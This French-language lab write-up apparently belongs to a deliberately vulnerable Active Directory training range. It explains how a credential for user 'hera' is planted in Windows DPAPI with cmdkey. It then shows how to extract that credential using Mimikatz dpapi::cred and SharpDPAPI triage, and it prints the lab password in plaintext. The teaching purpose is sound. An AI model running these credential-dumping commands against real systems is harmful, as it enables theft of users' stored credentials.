# DPAPI - Extraction des credentials de Hera

## Description
Les credentials de Hera sont maintenant stockés dans la DPAPI (Data Protection API) de Windows via la commande `cmdkey`.

## Configuration automatique
Le playbook `windows_dpapi.yml` configure automatiquement :
- Une tâche planifiée qui s'exécute au démarrage sous le compte `PANTHEON\hera`
- Injection du credential via : `cmdkey /add:pantheon.god /user:hera /pass:Qu33n0fG0ds!2025`
- Configuration sur les deux machines Windows : `pantheon-dc01` et `pantheon-enfers`

## Exploitation

### 1. Obtenir l'accès à une session de Hera
Pour extraire les credentials DPAPI, vous devez d'abord obtenir l'accès à une session utilisateur de Hera.

### 2. Dump des credentials DPAPI
Une fois connecté en tant que Hera, vous pouvez utiliser plusieurs méthodes :

#### Méthode 1 : Mimikatz
```powershell
# Lister les credentials stockés
cmdkey /list

# Utiliser Mimikatz pour extraire les credentials DPAPI
mimikatz "dpapi::cred /in:C:\Users\hera\AppData\Roaming\Microsoft\Credentials\<GUID>"
```

#### Méthode 2 : cmdkey natif
```cmd
# Lister les credentials stockés
cmdkey /list

# Les credentials seront visibles mais le mot de passe sera masqué
```

#### Méthode 3 : SharpDPAPI
```powershell
# Utiliser SharpDPAPI pour extraire les credentials
SharpDPAPI.exe triage
```

### 3. Credential trouvé
Après l'extraction DPAPI, vous devriez trouver :
- **Domaine** : `pantheon.god`
- **Utilisateur** : `hera`
- **Mot de passe** : `Qu33n0fG0ds!2025`

## Notes importantes
- Les credentials DPAPI sont spécifiques à l'utilisateur et au profil
- La tâche planifiée s'exécute au démarrage de chaque machine
- Les credentials sont protégés par la DPAPI de Windows et nécessitent les privilèges de l'utilisateur Hera pour être extraits

## Objectif pédagogique
Cette configuration permet d'apprendre :
- L'extraction de credentials depuis la DPAPI
- L'utilisation d'outils comme Mimikatz, SharpDPAPI
- Les faiblesses de stockage des credentials Windows
- Les techniques de post-exploitation 